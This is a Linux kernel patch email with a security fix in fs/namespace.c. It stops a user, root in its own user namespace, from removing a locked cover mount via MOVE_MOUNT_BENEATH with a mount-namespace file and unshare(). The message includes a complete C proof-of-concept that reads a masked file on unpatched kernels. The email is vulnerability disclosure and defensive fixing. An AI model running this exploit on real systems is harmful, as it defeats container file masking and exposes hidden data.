Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 20825483828;
	Wed, 14 Oct 2026 19:45:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792007131; cv=none; b=Ey4TVzwgChPilG+wgHVgKlofD4ROFthSCqNP5vzy2HpRKgxLBnFQo767ZPVIqDuAMpIGbtJnieoBV5Lpw30q79sMFoAEG59iaKx059KbQuF4rqFLHKQ3dN0hS0l4zIMUBMnqt+bCvTxROINZOCL1hf3r2lKLiYlG5FjhSgZzLFI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792007131; c=relaxed/simple;
	bh=5F0Q6eD5GQ/nLcRPJ2Sb3WembVDhFllLQVVgcb2pbuE=;
	h=From:Date:Subject:MIME-Version:Content-Type:Message-Id:References:
	 In-Reply-To:To:Cc; b=FY8wHwYgmGZDtZWyeV3sGL3Ohz4kj7sUFLrLcgIl1PtEGyhUmc0V1ODrTysr80vs6EECEtpnXGzUrMVqG4ncENs/OP2DQulE4JD7iTQ5sxPN9Gxn/dadk6FBBkt6HDYNNx7aBlMCFz/SiYp6GCjmKwZfTevCE9WaYoDyA2BAXsk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=En9q+KfF; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="En9q+KfF"
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 48E9B1F000C5;
	Wed, 14 Oct 2026 19:45:26 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1792007128;
	bh=kep9wdS4hXuVbGmLxH5rtBYzmKQXONY6skleSXycIko=;
	h=From:Date:Subject:References:In-Reply-To:To:Cc;
	b=En9q+KfFaoyaS97Y6egR6tXPttLPTh4X/r5DW73qUTufIEbzamse7LteyBP2bCRjE
	 oyTeIlJob5uK6eVGX/0YzVqXYreV7erULInDT/lUDOuGrapf84Z5oyYjhYVNoHQ8hy
	 6llfBPhVGC6f7nS1x24VqHkGqWgebQxmwVaKvBxNQ/ca7O2LzYBgMJfcMjOHzr2jHI
	 lxVq0EEnpMZEOzLU4wBLEcm1qSbWlvMQ4Yi24msMnct2DI8G03N6sLdXwts7rK7lES
	 wBauPrSlcKIpmgkXoHKSJxdxmDRUsj7GMOklXk2Ip6O86WnBilfXn5ksU8ug7p7v22
	 BrneZEG+T9qGg==
From: Christian Brauner <brauner@kernel.org>
Date: Wed, 14 Oct 2026 21:45:13 +0200
Subject: [PATCH 1/2] namespace: a mount that copy_tree() leaves out can't
 take over a lock
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
Message-Id: <20261014-work-namei-locked-mnt_ns_file-v1-1-24035bd5d8e9@kernel.org>
References: <20261014-work-namei-locked-mnt_ns_file-v1-0-24035bd5d8e9@kernel.org>
In-Reply-To: <20261014-work-namei-locked-mnt_ns_file-v1-0-24035bd5d8e9@kernel.org>
To: linux-fsdevel@vger.kernel.org
Cc: Alexander Viro <viro@zeniv.linux.org.uk>, Jan Kara <jack@suse.cz>, 
 Jeff Layton <jlayton@kernel.org>, Neil Brown <neil@brown.name>, 
 "Christian Brauner (Amutable)" <brauner@kernel.org>, 
 Chris Mason <mason@kernel.org>, stable@vger.kernel.org
X-Mailer: b4 0.17-dev-3d1b8
X-Developer-Signature: v=1; a=openpgp-sha256; l=11920; i=brauner@kernel.org;
 h=from:subject:message-id; bh=5F0Q6eD5GQ/nLcRPJ2Sb3WembVDhFllLQVVgcb2pbuE=;
 b=owGbwMvMwCU28Zj0gdSKO4sYT6slMWSdv30h605DIe8kpqyHTL3KWQ+PGn0zXun6cGu84aFXq
 41Md+rwd5SyMIhxMciKKbI4tJuEyy3nqdhslKkBM4eVCWQIAxenAExkzlWG/xXSt3lWLtuskyni
 Fcw+/9uXFqVXDhOkDS5Mqtp5+1OlUALD/7w9l1lWPRdVc++pMFteMWGSsIa+6Y9dbqwi5hLrC8Q
 nMAIA
X-Developer-Key: i=brauner@kernel.org; a=openpgp;
 fpr=4880B8C9BD0E5106FC070F4F7B3C391EFEA93624

Since commit c62a4766937e ("move_mount: transfer MNT_LOCKED") a mount
can be moved beneath a locked mount. The lock moves from the old cover
to the new mount which takes over the job of hiding what's under it and
the old cover can be unmounted. That works as long as the new mount
stays. But the caller picks the new mount and copy_tree() leaves a
mount of a mount namespace file out of every copy made without
CL_COPY_MNT_NS_FILE, together with everything mounted on it, and never
looks at MNT_LOCKED. unshare(CLONE_NEWNS) and mount propagation make
such copies.

So a task that is root in its own user namespace gets rid of a locked
cover on a file without a race and without touching the filesystem
below it. It makes a child with a mount namespace of its own, binds the
child's /proc/<pid>/ns/mnt beneath the cover with MOVE_MOUNT_BENEATH,
which hands the lock to that bind, and calls unshare(CLONE_NEWNS). The
new mount namespace has nothing on the file. That's the usual way to
mask a single file, a bind of /dev/null or of an empty file. With a
bind of an ordinary file the file stays covered.

copy_tree() already refuses to leave out a locked unbindable mount with
-EPERM since commit df7342b24018 ("mount: Don't allow copying
MNT_UNBINDABLE|MNT_LOCKED mounts"). Do the same for a locked mount of a
mount namespace file. That also covers a tree copied with
CL_COPY_MNT_NS_FILE and attached into a mount namespace of another user
namespace where lock_mnt_tree() locks it. Note that unshare(CLONE_NEWNS)
and clone(CLONE_NEWNS) fail with EPERM from such a mount namespace from
then on. The mount can't be left out and it can't be unmounted.

And refuse to move a mount of a mount namespace file beneath a locked
mount in the first place. Otherwise the task ends up with a mount it
can't unmount and an unshare() that fails for good.

Chris also found a second mount that goes away by itself, a clone of an
automounted mount that shrink_submounts() took along with its parent.
Commit f78ddcc87224 ("namespace: never expire a locked mount") took
care of that one.

Chris's reproducer is appended. Mode nsfile reads SECRET after the
unshare() on 7.3-rc7, with this patch the move_mount() fails with
EINVAL and the file stays covered. nsfile-control uses an ordinary file
and reads MASK both ways.

  // SPDX-License-Identifier: GPL-2.0
  /*
   * Get rid of a locked cover with MOVE_MOUNT_BENEATH.
   *
   * The "admin" (root) makes a tmpfs W:
   *     W/D         file, holds SECRET, covered by a bind of a file with MASK
   *     W/Dd/inner  file, holds SECRET, Dd is covered by a bind of a directory
   *                 whose "inner" holds MASK
   *     W/own       directory of uid 1000 with the file "mine" and the
   *                 directory "minedir", whose "inner" holds MINE
   *     W/dbg       debugfs, mode 755. dbg/tracing is an automount point
   * The "attacker" is uid 1000. It enters a new user namespace with a new mount
   * namespace, so W and both covers are locked there.
   *
   * usage: prog MODE
   *   plain      put a bind of own/mine beneath the cover of D, unmount the cover
   *   nsfile     put a bind of the mount namespace file of a child beneath the
   *              cover of D, then unshare(CLONE_NEWNS)
   *   nsfile-control    the same with a bind of own/mine
   *   shrink     put a bind of the automounted tracefs beneath the cover of Dd,
   *              unmount the cover, put a tmpfs beneath W, call umount(W), which fails
   *   shrink-control    the same with a bind of own/minedir
   * The environment variable AUTOMOUNT_DIR names another automount point for "shrink".
   */
  #define _GNU_SOURCE
  #include <errno.h>
  #include <fcntl.h>
  #include <grp.h>
  #include <sched.h>
  #include <signal.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <sys/mount.h>
  #include <sys/prctl.h>
  #include <sys/stat.h>
  #include <sys/wait.h>

  #ifndef MOVE_MOUNT_BENEATH
  #define MOVE_MOUNT_BENEATH 0x00000200
  #endif
  #define W "/run/x2"

  static void die(const char *what)
  {
  	fprintf(stderr, "FATAL %s: %s\n", what, strerror(errno));
  	exit(2);
  }

  static void put_file(const char *name, const char *content)
  {
  	int fd = open(name, O_CREAT | O_WRONLY | O_TRUNC, 0644);

  	if (fd < 0 || write(fd, content, strlen(content)) < 0)
  		die(name);
  	close(fd);
  }

  static void show(const char *path)
  {
  	char buf[32] = "";
  	int fd = open(path, O_RDONLY);

  	if (fd < 0) {
  		printf("attacker: open(%s) = %s\n", path, strerror(errno));
  		return;
  	}
  	if (read(fd, buf, sizeof(buf) - 1) < 0)
  		snprintf(buf, sizeof(buf), "<%s>", strerror(errno));
  	close(fd);
  	printf("attacker: read(%s) = \"%s\"%s\n", path, buf,
  	       strncmp(buf, "SECRET", 6) ? "" : "   <-- HIT");
  }

  static int say(const char *what, int ret)
  {
  	printf("attacker: %s: %s\n", what, ret ? strerror(errno) : "ok");
  	return ret;
  }

  static void write_str(const char *path, const char *s)
  {
  	int fd = open(path, O_WRONLY);

  	if (fd < 0 || write(fd, s, strlen(s)) < 0)
  		die(path);
  	close(fd);
  }

  static void mounts(void)
  {
  	if (system("grep x2 /proc/self/mountinfo"))
  		printf("attacker: no mounts listed\n");
  }

  static void admin_setup(void)
  {
  	if (unshare(CLONE_NEWNS) || mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL))
  		die("unshare");
  	mkdir(W, 0755);
  	if (mount("W", W, "tmpfs", 0, "mode=755"))
  		die("mount W");
  	if (mkdir(W "/Dd", 0755) || mkdir(W "/maskdir", 0755) || mkdir(W "/dbg", 0755) ||
  	    mkdir(W "/own", 0755) || mkdir(W "/own/minedir", 0755))
  		die("mkdir");
  	put_file(W "/D", "SECRET");
  	put_file(W "/Dd/inner", "SECRET");
  	put_file(W "/mask", "MASK");
  	put_file(W "/maskdir/inner", "MASK");
  	put_file(W "/own/mine", "MINE");
  	put_file(W "/own/minedir/inner", "MINE");
  	if (mount(W "/mask", W "/D", NULL, MS_BIND, NULL) ||
  	    mount(W "/maskdir", W "/Dd", NULL, MS_BIND, NULL))
  		die("covers");
  	if (mount("dbg", W "/dbg", "debugfs", 0, "mode=755"))
  		die("mount debugfs");
  }

  static void become_attacker(void)
  {
  	if (setgroups(0, NULL) || setresgid(1000, 1000, 1000) ||
  	    setresuid(1000, 1000, 1000) || prctl(PR_SET_DUMPABLE, 1))
  		die("drop to uid 1000");
  	if (unshare(CLONE_NEWUSER | CLONE_NEWNS))
  		die("unshare user and mount namespace");
  	write_str("/proc/self/setgroups", "deny");
  	write_str("/proc/self/uid_map", "0 1000 1");
  	write_str("/proc/self/gid_map", "0 1000 1");
  }

  /* clone the mount at @src and put the clone beneath the top mount at @where */
  static int beneath(const char *src, const char *where)
  {
  	char what[128];
  	int fd = open_tree(AT_FDCWD, src, OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC);
  	int ret;

  	snprintf(what, sizeof(what), "open_tree(%s, OPEN_TREE_CLONE)", src);
  	if (say(what, fd < 0))
  		return -1;
  	ret = move_mount(fd, "", AT_FDCWD, where,
  			 MOVE_MOUNT_F_EMPTY_PATH | MOVE_MOUNT_BENEATH);
  	snprintf(what, sizeof(what), "move_mount(clone, %s, MOVE_MOUNT_BENEATH)", where);
  	say(what, ret);
  	close(fd);
  	return ret;
  }

  static void do_nsfile(int control)
  {
  	char path[64] = W "/own/mine";
  	int pfd[2];
  	pid_t pid;
  	char c;

  	if (pipe(pfd))
  		die("pipe");
  	pid = fork();
  	if (pid < 0)
  		die("fork");
  	if (!pid) {
  		if (unshare(CLONE_NEWNS) || write(pfd[1], "g", 1) != 1)
  			die("child");
  		pause();
  		exit(0);
  	}
  	if (read(pfd[0], &c, 1) != 1)
  		die("sync");
  	if (!control)
  		snprintf(path, sizeof(path), "/proc/%d/ns/mnt", pid);
  	beneath(path, W "/D");
  	mounts();
  	say("unshare(CLONE_NEWNS)", unshare(CLONE_NEWNS));
  	show(W "/D");
  	mounts();
  	kill(pid, SIGKILL);
  	waitpid(pid, NULL, 0);
  }

  static void do_shrink(int control)
  {
  	const char *automount = getenv("AUTOMOUNT_DIR");
  	int fd, mfd;

  	if (!automount)
  		automount = W "/dbg/tracing";
  	beneath(control ? W "/own/minedir" : automount, W "/Dd");
  	say("umount2(Dd, 0), the old cover", umount2(W "/Dd", 0));
  	say("umount2(Dd, 0), the mount that was put beneath", umount2(W "/Dd", 0));
  	show(W "/Dd/inner");
  	say("umount2(W, 0)", umount2(W, 0));
  	fd = fsopen("tmpfs", FSOPEN_CLOEXEC);
  	if (fd < 0 || fsconfig(fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0))
  		die("fsopen tmpfs");
  	mfd = fsmount(fd, FSMOUNT_CLOEXEC, 0);
  	if (mfd < 0)
  		die("fsmount");
  	say("move_mount(new tmpfs, W, MOVE_MOUNT_BENEATH)",
  	    move_mount(mfd, "", AT_FDCWD, W, MOVE_MOUNT_F_EMPTY_PATH | MOVE_MOUNT_BENEATH));
  	close(mfd);
  	mounts();
  	say("umount2(W, 0)", umount2(W, 0));
  	show(W "/Dd/inner");
  	mounts();
  }

  int main(int argc, char **argv)
  {
  	const char *mode = argc > 1 ? argv[1] : "plain";

  	setvbuf(stdout, NULL, _IOLBF, 0);
  	admin_setup();
  	become_attacker();

  	show(W "/D");
  	show(W "/Dd/inner");
  	say("umount2(D, MNT_DETACH)", umount2(W "/D", MNT_DETACH));
  	say("umount2(Dd, MNT_DETACH)", umount2(W "/Dd", MNT_DETACH));

  	if (!strcmp(mode, "plain")) {
  		beneath(W "/own/mine", W "/D");
  		show(W "/D");
  		say("umount2(D, MNT_DETACH), the old cover", umount2(W "/D", MNT_DETACH));
  		show(W "/D");
  		say("umount2(D, MNT_DETACH), the mount that was put beneath",
  		    umount2(W "/D", MNT_DETACH));
  		show(W "/D");
  		mounts();
  	} else if (!strncmp(mode, "nsfile", 6)) {
  		do_nsfile(!strcmp(mode, "nsfile-control"));
  	} else {
  		do_shrink(!strcmp(mode, "shrink-control"));
  	}
  	return 0;
  }

Fixes: c62a4766937e ("move_mount: transfer MNT_LOCKED")
Reported-by: Chris Mason <mason@kernel.org>
Cc: stable@vger.kernel.org # v7.1+
Signed-off-by: Christian Brauner (Amutable) <brauner@kernel.org>
---
 fs/namespace.c | 19 +++++++++++++++++--
 1 file changed, 17 insertions(+), 2 deletions(-)

diff --git a/fs/namespace.c b/fs/namespace.c
index b55cd0e8c865..c30f063742f4 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2252,6 +2252,11 @@ struct mount *copy_tree(struct mount *src_root, struct dentry *dentry,
 			}
 			if (!(flag & CL_COPY_MNT_NS_FILE) &&
 			    is_mnt_ns_file(src_mnt->mnt.mnt_root)) {
+				if (src_mnt->mnt.mnt_flags & MNT_LOCKED) {
+					/* Both a mount namespace file and locked. */
+					dst_mnt = ERR_PTR(-EPERM);
+					goto out;
+				}
 				src_mnt = skip_mnt_tree(src_mnt);
 				continue;
 			}
@@ -3647,8 +3652,9 @@ static bool mount_is_ancestor(const struct mount *p1, const struct mount *p2)
  * @mnt_to:   mount under which to mount
  * @mp:   mountpoint of @mnt_to
  *
- * - Make sure that the caller can unmount the topmost mount ensuring
- *   that the caller could reveal the underlying mountpoint.
+ * - Make sure that @mnt_from can take over the lock of @mnt_to. A
+ *   mount of a mount namespace file is left out of a copy of the tree
+ *   and can't.
  * - Ensure that nothing has been mounted on top of @mnt_from before we
  *   grabbed @namespace_sem to avoid creating pointless shadow mounts.
  * - Prevent mounting beneath a mount if the propagation relationship
@@ -3664,6 +3670,15 @@ static int can_move_mount_beneath(const struct mount *mnt_from,
 {
 	struct mount *parent_mnt_to = mnt_to->mnt_parent;
 
+	/*
+	 * @mnt_from takes over the lock of @mnt_to. copy_tree() leaves a
+	 * mount of a mount namespace file out of every copy made without
+	 * CL_COPY_MNT_NS_FILE, together with what is mounted on it, so it
+	 * can't keep anything hidden.
+	 */
+	if (IS_MNT_LOCKED(mnt_to) && is_mnt_ns_file(mnt_from->mnt.mnt_root))
+		return -EINVAL;
+
 	/* Avoid creating shadow mounts during mount propagation. */
 	if (mnt_from->overmount)
 		return -EINVAL;

-- 
2.53.0

